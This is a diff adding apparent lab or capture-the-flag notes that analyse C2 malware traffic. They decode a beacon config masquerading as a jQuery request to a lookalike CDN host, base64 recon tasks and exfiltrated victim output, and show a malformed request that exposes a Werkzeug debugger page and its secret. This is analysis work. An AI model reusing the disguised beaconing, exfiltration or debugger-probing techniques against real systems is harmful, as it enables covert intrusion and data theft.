@@ -1,0 +1,702 @@
+the c2 server seems to contain a js file (jquery) followed by a task to execute
+
+with the c2 server we can only save commands to the database (with GET) and outputs (with POST), see exploit.py to view my attempts so far 
+it seems the exploit is a format string vulnerability when inserting data to the database, I'll continue researching this tomorrow
+
+
+tcp stream eq 0 (GET):
+GET /assets/jquery-3.6.0.slim.min.js HTTP/1.1
+Host: cdnjs.cloudflair.co
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edge/44.18363.1337
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Accept-Language: en-US,en;q=0.5
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: cross-site
+Cookie: __cflb=49f062b5-8b94-4fff-bb41-d504b148aa1b;
+config:
+{
+    "sleeptime": 3000, 
+    "jitter": 5,
+     "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML,
+      like Gecko) Chrome/103.0.0.0 Safari/537.36 Edge/44.18363.1337",
+       "headers": {
+            "Accept": "*/*", 
+            "Accept-Language": "en-US,en;q=0.5",
+             "Accept-Encoding": " gzip, deflate", 
+             "Sec-Fetch-Dest": " empty", 
+             "Sec-Fetch-Mode": " cors",
+              "Sec-Fetch-Site": " cross-site", 
+              "Cookie": "__cflb=$$UUID$$; __cfuid=$$RECV$$"
+        }, 
+    "get_uri": "/assets/jquery-3.6.0.slim.min.js",
+     "set_uri": "/assets/jquery-3.6.0.slim.min.js", 
+     "uuid": "49f062b5-8b94-4fff-bb41-d504b148aa1b"
+}
+task:
+{'id': 18, 'cmd': 'd2hvYW1pIC9hbGw='} // whoami /all
+tcp stream eq 1 (GET):
+__cflb=49f062b5-8b94-4fff-bb41-d504b148aa1b
+task="eyJpZCI6IDE4LCAiY21kIjogImQyaHZZVzFwSUM5aGJHdz0ifQ=="; // {"id": 18, "cmd": "d2hvYW1pIC9hbGw="} // whoami /all
+
+tcp stream eq 2 (POST):
+cfuid=eyJpZCI6IDE4LCAib3V0cHV0IjogIkNsVlRSVklnU1U1R1QxSk5RVlJKVDA0S0xTMHRMUzB0TFMwdExTMHRMUzB0TFFvS1ZYTmxjaUJPWVcxbElDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdVMGxFSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQW85UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFNBOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOUNtUmxjMnQwYjNBdGNYWXpibkZzYlZ4c1lYSnllU0J6ZEdWMlpXNXpJRk10TVMwMUxUSXhMVEl3TWpreU56Z3lNRGd0TVRnNU9USTJNalV3TmkweU5UTXpPVGc1TlRBM0xURXdNREFLQ2dwSFVrOVZVQ0JKVGtaUFVrMUJWRWxQVGdvdExTMHRMUzB0TFMwdExTMHRMUzB0TFFvS1IzSnZkWEFnVG1GdFpTQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCVWVYQmxJQ0FnSUNBZ0lDQWdJQ0FnSUZOSlJDQWdJQ0FnSUNBZ0lDQkJkSFJ5YVdKMWRHVnpJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUFvOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5SUQwOVBUMDlQVDA5UFQwOVBUMDlQVDBnUFQwOVBUMDlQVDA5UFQwOUlEMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5Q2tWMlpYSjViMjVsSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnVjJWc2JDMXJibTkzYmlCbmNtOTFjQ0JUTFRFdE1TMHdJQ0FnSUNBZ1RXRnVaR0YwYjNKNUlHZHliM1Z3TENCRmJtRmliR1ZrSUdKNUlHUmxabUYxYkhRc0lFVnVZV0pzWldRZ1ozSnZkWEFLVGxRZ1FWVlVTRTlTU1ZSWlhFeHZZMkZzSUdGalkyOTFiblFnWVc1a0lHMWxiV0psY2lCdlppQkJaRzFwYm1semRISmhkRzl5Y3lCbmNtOTFjQ0JYWld4c0xXdHViM2R1SUdkeWIzVndJRk10TVMwMUxURXhOQ0FnSUNCSGNtOTFjQ0IxYzJWa0lHWnZjaUJrWlc1NUlHOXViSGtnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQXBDVlVsTVZFbE9YRUZrYldsdWFYTjBjbUYwYjNKeklDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJRUZzYVdGeklDQWdJQ0FnSUNBZ0lDQWdVeTB4TFRVdE16SXROVFEwSUVkeWIzVndJSFZ6WldRZ1ptOXlJR1JsYm5rZ2IyNXNlU0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdDa0pWU1V4VVNVNWNWWE5sY25NZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdRV3hwWVhNZ0lDQWdJQ0FnSUNBZ0lDQlRMVEV0TlMwek1pMDFORFVnVFdGdVpHRjBiM0o1SUdkeWIzVndMQ0JGYm1GaWJHVmtJR0o1SUdSbFptRjFiSFFzSUVWdVlXSnNaV1FnWjNKdmRYQUtUbFFnUVZWVVNFOVNTVlJaWEVsT1ZFVlNRVU5VU1ZaRklDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQlhaV3hzTFd0dWIzZHVJR2R5YjNWd0lGTXRNUzAxTFRRZ0lDQWdJQ0JOWVc1a1lYUnZjbmtnWjNKdmRYQXNJRVZ1WVdKc1pXUWdZbmtnWkdWbVlYVnNkQ3dnUlc1aFlteGxaQ0JuY205MWNBcERUMDVUVDB4RklFeFBSMDlPSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lGZGxiR3d0YTI1dmQyNGdaM0p2ZFhBZ1V5MHhMVEl0TVNBZ0lDQWdJRTFoYm1SaGRHOXllU0JuY205MWNDd2dSVzVoWW14bFpDQmllU0JrWldaaGRXeDBMQ0JGYm1GaWJHVmtJR2R5YjNWd0NrNVVJRUZWVkVoUFVrbFVXVnhCZFhSb1pXNTBhV05oZEdWa0lGVnpaWEp6SUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ1YyVnNiQzFyYm05M2JpQm5jbTkxY0NCVExURXROUzB4TVNBZ0lDQWdUV0Z1WkdGMGIzSjVJR2R5YjNWd0xDQkZibUZpYkdWa0lHSjVJR1JsWm1GMWJIUXNJRVZ1WVdKc1pXUWdaM0p2ZFhBS1RsUWdRVlZVU0U5U1NWUlpYRlJvYVhNZ1QzSm5ZVzVwZW1GMGFXOXVJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCWFpXeHNMV3R1YjNkdUlHZHliM1Z3SUZNdE1TMDFMVEUxSUNBZ0lDQk5ZVzVrWVhSdmNua2daM0p2ZFhBc0lFVnVZV0pzWldRZ1lua2daR1ZtWVhWc2RDd2dSVzVoWW14bFpDQm5jbTkxY0FwT1ZDQkJWVlJJVDFKSlZGbGNURzlqWVd3Z1lXTmpiM1Z1ZENBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUZkbGJHd3RhMjV2ZDI0Z1ozSnZkWEFnVXkweExUVXRNVEV6SUNBZ0lFMWhibVJoZEc5eWVTQm5jbTkxY0N3Z1JXNWhZbXhsWkNCaWVTQmtaV1poZFd4MExDQkZibUZpYkdWa0lHZHliM1Z3Q2t4UFEwRk1JQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnVjJWc2JDMXJibTkzYmlCbmNtOTFjQ0JUTFRFdE1pMHdJQ0FnSUNBZ1RXRnVaR0YwYjNKNUlHZHliM1Z3TENCRmJtRmliR1ZrSUdKNUlHUmxabUYxYkhRc0lFVnVZV0pzWldRZ1ozSnZkWEFLVGxRZ1FWVlVTRTlTU1ZSWlhFNVVURTBnUVhWMGFHVnVkR2xqWVhScGIyNGdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JYWld4c0xXdHViM2R1SUdkeWIzVndJRk10TVMwMUxUWTBMVEV3SUNCTllXNWtZWFJ2Y25rZ1ozSnZkWEFzSUVWdVlXSnNaV1FnWW5rZ1pHVm1ZWFZzZEN3Z1JXNWhZbXhsWkNCbmNtOTFjQXBOWVc1a1lYUnZjbmtnVEdGaVpXeGNUV1ZrYVhWdElFMWhibVJoZEc5eWVTQk1aWFpsYkNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJRXhoWW1Wc0lDQWdJQ0FnSUNBZ0lDQWdVeTB4TFRFMkxUZ3hPVElnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdDZ29LVUZKSlZrbE1SVWRGVXlCSlRrWlBVazFCVkVsUFRnb3RMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0Q2dwUWNtbDJhV3hsWjJVZ1RtRnRaU0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQkVaWE5qY21sd2RHbHZiaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdVM1JoZEdVZ0lDQUtQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDBnUFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5SUQwOVBUMDlQVDA5Q2xObFUyaDFkR1J2ZDI1UWNtbDJhV3hsWjJVZ0lDQWdJQ0FnSUNBZ0lGTm9kWFFnWkc5M2JpQjBhR1VnYzNsemRHVnRJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQkVhWE5oWW14bFpBcFRaVU5vWVc1blpVNXZkR2xtZVZCeWFYWnBiR1ZuWlNBZ0lDQWdJQ0JDZVhCaGMzTWdkSEpoZG1WeWMyVWdZMmhsWTJ0cGJtY2dJQ0FnSUNBZ0lDQWdJQ0FnUlc1aFlteGxaQ0FLVTJWVmJtUnZZMnRRY21sMmFXeGxaMlVnSUNBZ0lDQWdJQ0FnSUNBZ1VtVnRiM1psSUdOdmJYQjFkR1Z5SUdaeWIyMGdaRzlqYTJsdVp5QnpkR0YwYVc5dUlFUnBjMkZpYkdWa0NsTmxTVzVqY21WaGMyVlhiM0pyYVc1blUyVjBVSEpwZG1sc1pXZGxJRWx1WTNKbFlYTmxJR0VnY0hKdlkyVnpjeUIzYjNKcmFXNW5JSE5sZENBZ0lDQWdJQ0JFYVhOaFlteGxaQXBUWlZScGJXVmFiMjVsVUhKcGRtbHNaV2RsSUNBZ0lDQWdJQ0FnSUNCRGFHRnVaMlVnZEdobElIUnBiV1VnZW05dVpTQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ1JHbHpZV0pzWldRSyJ9
+//{"id": 18, "output": "ClVTRVIgSU5GT1JNQVRJT04KLS0tLS0tLS0tLS0tLS0tLQoKVXNlciBOYW1lICAgICAgICAgICAgICAgICAgICAgU0lEICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PSA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CmRlc2t0b3AtcXYzbnFsbVxsYXJyeSBzdGV2ZW5zIFMtMS01LTIxLTIwMjkyNzgyMDgtMTg5OTI2MjUwNi0yNTMzOTg5NTA3LTEwMDAKCgpHUk9VUCBJTkZPUk1BVElPTgotLS0tLS0tLS0tLS0tLS0tLQoKR3JvdXAgTmFtZSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUeXBlICAgICAgICAgICAgIFNJRCAgICAgICAgICBBdHRyaWJ1dGVzICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09ID09PT09PT09PT09PT09PT0gPT09PT09PT09PT09ID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CkV2ZXJ5b25lICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgV2VsbC1rbm93biBncm91cCBTLTEtMS0wICAgICAgTWFuZGF0b3J5IGdyb3VwLCBFbmFibGVkIGJ5IGRlZmF1bHQsIEVuYWJsZWQgZ3JvdXAKTlQgQVVUSE9SSVRZXExvY2FsIGFjY291bnQgYW5kIG1lbWJlciBvZiBBZG1pbmlzdHJhdG9ycyBncm91cCBXZWxsLWtub3duIGdyb3VwIFMtMS01LTExNCAgICBHcm91cCB1c2VkIGZvciBkZW55IG9ubHkgICAgICAgICAgICAgICAgICAgICAgICAgIApCVUlMVElOXEFkbWluaXN0cmF0b3JzICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEFsaWFzICAgICAgICAgICAgUy0xLTUtMzItNTQ0IEdyb3VwIHVzZWQgZm9yIGRlbnkgb25seSAgICAgICAgICAgICAgICAgICAgICAgICAgCkJVSUxUSU5cVXNlcnMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQWxpYXMgICAgICAgICAgICBTLTEtNS0zMi01NDUgTWFuZGF0b3J5IGdyb3VwLCBFbmFibGVkIGJ5IGRlZmF1bHQsIEVuYWJsZWQgZ3JvdXAKTlQgQVVUSE9SSVRZXElOVEVSQUNUSVZFICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBXZWxsLWtub3duIGdyb3VwIFMtMS01LTQgICAgICBNYW5kYXRvcnkgZ3JvdXAsIEVuYWJsZWQgYnkgZGVmYXVsdCwgRW5hYmxlZCBncm91cApDT05TT0xFIExPR09OICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdlbGwta25vd24gZ3JvdXAgUy0xLTItMSAgICAgIE1hbmRhdG9yeSBncm91cCwgRW5hYmxlZCBieSBkZWZhdWx0LCBFbmFibGVkIGdyb3VwCk5UIEFVVEhPUklUWVxBdXRoZW50aWNhdGVkIFVzZXJzICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgV2VsbC1rbm93biBncm91cCBTLTEtNS0xMSAgICAgTWFuZGF0b3J5IGdyb3VwLCBFbmFibGVkIGJ5IGRlZmF1bHQsIEVuYWJsZWQgZ3JvdXAKTlQgQVVUSE9SSVRZXFRoaXMgT3JnYW5pemF0aW9uICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBXZWxsLWtub3duIGdyb3VwIFMtMS01LTE1ICAgICBNYW5kYXRvcnkgZ3JvdXAsIEVuYWJsZWQgYnkgZGVmYXVsdCwgRW5hYmxlZCBncm91cApOVCBBVVRIT1JJVFlcTG9jYWwgYWNjb3VudCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdlbGwta25vd24gZ3JvdXAgUy0xLTUtMTEzICAgIE1hbmRhdG9yeSBncm91cCwgRW5hYmxlZCBieSBkZWZhdWx0LCBFbmFibGVkIGdyb3VwCkxPQ0FMICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgV2VsbC1rbm93biBncm91cCBTLTEtMi0wICAgICAgTWFuZGF0b3J5IGdyb3VwLCBFbmFibGVkIGJ5IGRlZmF1bHQsIEVuYWJsZWQgZ3JvdXAKTlQgQVVUSE9SSVRZXE5UTE0gQXV0aGVudGljYXRpb24gICAgICAgICAgICAgICAgICAgICAgICAgICAgICBXZWxsLWtub3duIGdyb3VwIFMtMS01LTY0LTEwICBNYW5kYXRvcnkgZ3JvdXAsIEVuYWJsZWQgYnkgZGVmYXVsdCwgRW5hYmxlZCBncm91cApNYW5kYXRvcnkgTGFiZWxcTWVkaXVtIE1hbmRhdG9yeSBMZXZlbCAgICAgICAgICAgICAgICAgICAgICAgIExhYmVsICAgICAgICAgICAgUy0xLTE2LTgxOTIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCgoKUFJJVklMRUdFUyBJTkZPUk1BVElPTgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgpQcml2aWxlZ2UgTmFtZSAgICAgICAgICAgICAgICBEZXNjcmlwdGlvbiAgICAgICAgICAgICAgICAgICAgICAgICAgU3RhdGUgICAKPT09PT09PT09PT09PT09PT09PT09PT09PT09PT0gPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09ID09PT09PT09ClNlU2h1dGRvd25Qcml2aWxlZ2UgICAgICAgICAgIFNodXQgZG93biB0aGUgc3lzdGVtICAgICAgICAgICAgICAgICBEaXNhYmxlZApTZUNoYW5nZU5vdGlmeVByaXZpbGVnZSAgICAgICBCeXBhc3MgdHJhdmVyc2UgY2hlY2tpbmcgICAgICAgICAgICAgRW5hYmxlZCAKU2VVbmRvY2tQcml2aWxlZ2UgICAgICAgICAgICAgUmVtb3ZlIGNvbXB1dGVyIGZyb20gZG9ja2luZyBzdGF0aW9uIERpc2FibGVkClNlSW5jcmVhc2VXb3JraW5nU2V0UHJpdmlsZWdlIEluY3JlYXNlIGEgcHJvY2VzcyB3b3JraW5nIHNldCAgICAgICBEaXNhYmxlZApTZVRpbWVab25lUHJpdmlsZWdlICAgICAgICAgICBDaGFuZ2UgdGhlIHRpbWUgem9uZSAgICAgICAgICAgICAgICAgRGlzYWJsZWQK"}
+output of task 18:
+
+USER INFORMATION
+----------------
+
+User Name                     SID                                           
+============================= ==============================================
+desktop-qv3nqlm\larry stevens S-1-5-21-2029278208-1899262506-2533989507-1000
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                                    Type             SID          Attributes                                        
+============================================================= ================ ============ ==================================================
+Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only                          
+BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only                          
+BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192                                                    
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                          State   
+============================= ==================================== ========
+SeShutdownPrivilege           Shut down the system                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
+SeUndockPrivilege             Remove computer from docking station Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
+SeTimeZonePrivilege           Change the time zone                 Disabled
+
+
+tcp stream eq 3 (GET):
+task = {"id": 19, "cmd": "YXJwIC1h"} // arp -a
+
+tcp stream eq 4 (POST):
+{"id": 19, "output": "CkludGVyZmFjZTogMTkyLjE2OC4xMzcuMTMxIC0tLSAweDYKICBJbnRlcm5ldCBBZGRyZXNzICAgICAgUGh5c2ljYWwgQWRkcmVzcyAgICAgIFR5cGUKICAxOTIuMTY4LjEzNy4xICAgICAgICAgMDAtNTAtNTYtYzAtMDAtMDEgICAgIGR5bmFtaWMgICAKICAxOTIuMTY4LjEzNy4yNTQgICAgICAgMDAtNTAtNTYtZjgtM2ItOTAgICAgIGR5bmFtaWMgICAKICAxOTIuMTY4LjEzNy4yNTUgICAgICAgZmYtZmYtZmYtZmYtZmYtZmYgICAgIHN0YXRpYyAgICAKICAyMjQuMC4wLjIyICAgICAgICAgICAgMDEtMDAtNWUtMDAtMDAtMTYgICAgIHN0YXRpYyAgICAKICAyMjQuMC4wLjI1MSAgICAgICAgICAgMDEtMDAtNWUtMDAtMDAtZmIgICAgIHN0YXRpYyAgICAKICAyMjQuMC4wLjI1MiAgICAgICAgICAgMDEtMDAtNWUtMDAtMDAtZmMgICAgIHN0YXRpYyAgICAKICAyMzkuMjU1LjI1NS4yNTAgICAgICAgMDEtMDAtNWUtN2YtZmYtZmEgICAgIHN0YXRpYyAgICAKICAyNTUuMjU1LjI1NS4yNTUgICAgICAgZmYtZmYtZmYtZmYtZmYtZmYgICAgIHN0YXRpYyAgICA="}
+output:
+Interface: 192.168.137.131 --- 0x6
+  Internet Address      Physical Address      Type
+  192.168.137.1         00-50-56-c0-00-01     dynamic   
+  192.168.137.254       00-50-56-f8-3b-90     dynamic   
+  192.168.137.255       ff-ff-ff-ff-ff-ff     static    
+  224.0.0.22            01-00-5e-00-00-16     static    
+  224.0.0.251           01-00-5e-00-00-fb     static    
+  224.0.0.252           01-00-5e-00-00-fc     static    
+  239.255.255.250       01-00-5e-7f-ff-fa     static    
+  255.255.255.255       ff-ff-ff-ff-ff-ff     static    
+
+tcp stream eq 5(GET):
+
+{"id": 20, "cmd": "aXBjb25maWcgL2FsbA=="} // ipconfig /all
+
+tcp stream eq 6(POST)
+
+POST /assets/jquery-3.6.0.slim.min.js HTTP/1.1
+Host: cdnjs.cloudflair.co
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edge/44.18363.1337
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Accept-Language: en-US,en;q=0.5
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: cross-site
+Cookie: __cflb=49f062b5-8b94-4fff-bb41-d504b148aa1b; __cfuid==
+Content-Length: 0
+
+HTTP/1.1 500 INTERNAL SERVER ERROR
+Server: Werkzeug/2.1.2 Python/3.8.13
+Date: Fri, 24 Jun 2022 17:05:45 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 18647
+Connection: close
+
+<!doctype html>
+<html lang=en>
+  <head>
+    <title>json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+ // Werkzeug Debugger</title>
+    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css">
+    <link rel="shortcut icon"
+        href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
+    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
+    <script>
+      var CONSOLE_MODE = false,
+          EVALEX = false,
+          EVALEX_TRUSTED = false,
+          SECRET = "FmN3FSsiUpAt8sKOQU94";
+    </script>
+  </head>
+  <body style="background-color: #fff">
+    <div class="debugger">
+<h1>JSONDecodeError</h1>
+<div class="detail">
+  <p class="errormsg">json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+</p>
+</div>
+<h2 class="traceback">Traceback <em>(most recent call last)</em></h2>
+<div class="traceback">
+  <h3></h3>
+  <ul><li><div class="frame" id="frame-139855013021840">
+  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
+      line <em class="line">2095</em>,
+      in <code class="function">__call__</code></h4>
+  <div class="source library"><pre class="line before"><span class="ws">    </span>def __call__(self, environ: dict, start_response: t.Callable) -&gt; t.Any:</pre>
+<pre class="line before"><span class="ws">        </span>&quot;&quot;&quot;The WSGI server calls the Flask application object as the</pre>
+<pre class="line before"><span class="ws">        </span>WSGI application. This calls :meth:`wsgi_app`, which can be</pre>
+<pre class="line before"><span class="ws">        </span>wrapped to apply middleware.</pre>
+<pre class="line before"><span class="ws">        </span>&quot;&quot;&quot;</pre>
+<pre class="line current"><span class="ws">        </span>return self.wsgi_app(environ, start_response)</pre></div>
+</div>
+
+<li><div class="frame" id="frame-139855013021504">
+  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
+      line <em class="line">2080</em>,
+      in <code class="function">wsgi_app</code></h4>
+  <div class="source library"><pre class="line before"><span class="ws">            </span>try:</pre>
+<pre class="line before"><span class="ws">                </span>ctx.push()</pre>
+<pre class="line before"><span class="ws">                </span>response = self.full_dispatch_request()</pre>
+<pre class="line before"><span class="ws">            </span>except Exception as e:</pre>
+<pre class="line before"><span class="ws">                </span>error = e</pre>
+<pre class="line current"><span class="ws">                </span>response = self.handle_exception(e)</pre>
+<pre class="line after"><span class="ws">            </span>except:  # noqa: B001</pre>
+<pre class="line after"><span class="ws">                </span>error = sys.exc_info()[1]</pre>
+<pre class="line after"><span class="ws">                </span>raise</pre>
+<pre class="line after"><span class="ws">            </span>return response(environ, start_response)</pre>
+<pre class="line after"><span class="ws">        </span>finally:</pre></div>
+</div>
+
+<li><div class="frame" id="frame-139855013021056">
+  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
+      line <em class="line">2077</em>,
+      in <code class="function">wsgi_app</code></h4>
+  <div class="source library"><pre class="line before"><span class="ws">        </span>ctx = self.request_context(environ)</pre>
+<pre class="line before"><span class="ws">        </span>error: t.Optional[BaseException] = None</pre>
+<pre class="line before"><span class="ws">        </span>try:</pre>
+<pre class="line before"><span class="ws">            </span>try:</pre>
+<pre class="line before"><span class="ws">                </span>ctx.push()</pre>
+<pre class="line current"><span class="ws">                </span>response = self.full_dispatch_request()</pre>
+<pre class="line after"><span class="ws">            </span>except Exception as e:</pre>
+<pre class="line after"><span class="ws">                </span>error = e</pre>
+<pre class="line after"><span class="ws">                </span>response = self.handle_exception(e)</pre>
+<pre class="line after"><span class="ws">            </span>except:  # noqa: B001</pre>
+<pre class="line after"><span class="ws">                </span>error = sys.exc_info()[1]</pre></div>
+</div>
+
+<li><div class="frame" id="frame-139855013021280">
+  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
+      line <em class="line">1525</em>,
+      in <code class="function">full_dispatch_request</code></h4>
+  <div class="source library"><pre class="line before"><span class="ws">            </span>request_started.send(self)</pre>
+<pre class="line before"><span class="ws">            </span>rv = self.preprocess_request()</pre>
+<pre class="line before"><span class="ws">            </span>if rv is None:</pre>
+<pre class="line before"><span class="ws">                </span>rv = self.dispatch_request()</pre>
+<pre class="line before"><span class="ws">        </span>except Exception as e:</pre>
+<pre class="line current"><span class="ws">            </span>rv = self.handle_user_exception(e)</pre>
+<pre class="line after"><span class="ws">        </span>return self.finalize_request(rv)</pre>
+<pre class="line after"><span class="ws"></span> </pre>
+<pre class="line after"><span class="ws">    </span>def finalize_request(</pre>
+<pre class="line after"><span class="ws">        </span>self,</pre>
+<pre class="line after"><span class="ws">        </span>rv: t.Union[ResponseReturnValue, HTTPException],</pre></div>
+</div>
+
+<li><div class="frame" id="frame-139855013021392">
+  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
+      line <em class="line">1523</em>,
+      in <code class="function">full_dispatch_request</code></h4>
+  <div class="source library"><pre class="line before"><span class="ws">        </span>self.try_trigger_before_first_request_functions()</pre>
+<pre class="line before"><span class="ws">        </span>try:</pre>
+<pre class="line before"><span class="ws">            </span>request_started.send(self)</pre>
+<pre class="line before"><span class="ws">            </span>rv = self.preprocess_request()</pre>
+<pre class="line before"><span class="ws">            </span>if rv is None:</pre>
+<pre class="line current"><span class="ws">                </span>rv = self.dispatch_request()</pre>
+<pre class="line after"><span class="ws">        </span>except Exception as e:</pre>
